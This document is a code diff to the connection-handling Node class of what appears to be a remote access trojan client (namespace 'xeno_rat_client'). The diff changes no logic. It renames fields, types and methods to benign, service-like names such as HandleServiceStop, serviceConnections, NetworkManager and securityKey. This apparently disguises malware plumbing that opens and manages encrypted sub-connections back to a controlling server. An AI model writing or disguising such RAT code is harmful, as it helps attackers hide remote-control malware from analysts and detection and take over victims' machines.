@@ -13,21 +13,21 @@ namespace xeno_rat_client
         [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
         private static extern int memcmp(byte[] b1, byte[] b2, long count);
         
-        private Action<Node> OnDisconnect;
-        public List<Node> subNodes = new List<Node>();
-        public SocketHandler sock;
+        private Action<Node> HandleServiceStop;
+        public List<Node> serviceConnections = new List<Node>();
+        public NetworkManager sock;
         public Node Parent;
         public int ID = -1;
         public int SetId = -1;
-        public int SockType = -1;
-        public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
+        public int connectionType = -1;
+        public Node(NetworkManager _sock, Action<Node> _HandleServiceStop)
         {
             sock = _sock;
-            OnDisconnect = _OnDisconnect;
+            HandleServiceStop = _HandleServiceStop;
         }
         public void AddSubNode(Node subNode) 
         {
-            subNodes.Add(subNode);
+            serviceConnections.Add(subNode);
         }
         public async void Disconnect()
         {
@@ -43,28 +43,28 @@ namespace xeno_rat_client
                 sock.sock?.Close(0);
             }
             sock.sock?.Dispose();
-            List<Node> copy = subNodes.ToList();
-            subNodes.Clear();
+            List<Node> copy = serviceConnections.ToList();
+            serviceConnections.Clear();
             foreach (Node i in copy)
             {
                 i?.Disconnect();
             }
             copy.Clear();
-            if (OnDisconnect != null)
+            if (HandleServiceStop != null)
             {
-                OnDisconnect(this);
+                HandleServiceStop(this);
             }
         }
 
 
-        public async Task<Node> ConnectSubSockAsync(int type, int retid, Action<Node> OnDisconnect = null)
+        public async Task<Node> InitializeConnectionAsync(int type, int retid, Action<Node> HandleServiceStop = null)
         {
             try
             {
                 Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 await socket.ConnectAsync(sock.sock.RemoteEndPoint);
 
-                Node sub = await Utils.ConnectAndSetupAsync(socket, sock.EncryptionKey, type, ID, OnDisconnect);
+                Node sub = await Utils.ConnectAndSetupAsync(socket, sock.securityKey, type, ID, HandleServiceStop);
                 byte[] byteRetid = new byte[] { (byte)retid };
                 await sub.SendAsync(byteRetid);
                 byte[] worked = new byte[] { 1 };
@@ -136,8 +136,8 @@ namespace xeno_rat_client
                 sock.ResetRecvTimeout();
                 if (ByteArrayCompare(comp, data))
                 {
-                    byte[] _SockType = sock.IntToBytes(type);
-                    if (!(await sock.SendAsync(_SockType)))
+                    byte[] _connectionType = sock.IntToBytes(type);
+                    if (!(await sock.SendAsync(_connectionType)))
                     {
                         return false;
                     }
@@ -156,7 +156,7 @@ namespace xeno_rat_client
                             return false;
                         }
                     }
-                    SockType = type;
+                    connectionType = type;
                     return true;
                 }
             }
